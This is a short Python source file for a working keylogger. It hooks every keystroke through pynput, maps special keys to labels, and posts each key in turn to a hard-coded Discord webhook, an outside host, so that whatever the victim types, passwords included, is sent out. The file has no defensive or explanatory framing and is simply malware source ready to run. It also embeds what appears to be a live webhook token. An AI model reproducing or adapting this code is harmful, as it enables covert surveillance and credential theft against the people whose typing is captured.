import requests
from pynput import keyboard

# Your Discord webhook URL
WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1285284225011945472/SX1X6-7wLEme6JdTr31kAs4tYjF_gCRSpxTb1DTXZR4xh0o1U6KvsZTy1aGp1STXhaQk'

# Function to send a message to Discord
def send_to_discord(message):
    try:
        data = {
            'content': message
        }
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code != 204:
            print(f"Failed to send message to Discord. Status code: {response.status_code}")
    except Exception as e:
        print("ERROR: Could not send message to Discord:", e)

def on_press(key):
    try:
        char = getattr(key, 'char', None)
        if char is not None:
            send_to_discord(f'Key pressed: {char}')
        else:
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.backspace: ' [BACKSPACE] ',
                keyboard.Key.enter: ' [ENTER] ',
                keyboard.Key.shift: ' [SHIFT] ',
                keyboard.Key.shift_l: ' [SHIFT] ',
                keyboard.Key.shift_r: ' [SHIFT] ',
                keyboard.Key.tab: ' [TAB] ',
                keyboard.Key.ctrl: ' [CTRL] ',
                keyboard.Key.ctrl_l: ' [CTRL] ',
                keyboard.Key.ctrl_r: ' [CTRL] ',
                keyboard.Key.alt: ' [ALT] ',
                keyboard.Key.alt_l: ' [ALT] ',
                keyboard.Key.alt_r: ' [ALT] ',
                keyboard.Key.alt_gr: ' [ALT] ',
                keyboard.Key.caps_lock: ' [CAPS-LOCK] ',
                keyboard.Key.num_lock: ' [NUM-LOCK] ',
                keyboard.Key.esc: ' [ESC] ',
                keyboard.Key.delete: ' [DELETE] ',
                keyboard.Key.page_up: ' [PAGE-UP] ',
                keyboard.Key.page_down: ' [PAGE-DOWN] ',
                keyboard.Key.insert: ' [INSERT] ',
                keyboard.Key.print_screen: ' [PRINT-SCREEN] ',
            }
            special_key = special_keys.get(key)
            if special_key:
                send_to_discord(f'Special key pressed: {special_key}')
    except Exception as e:
        print("ERROR: Could not process key:", e)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
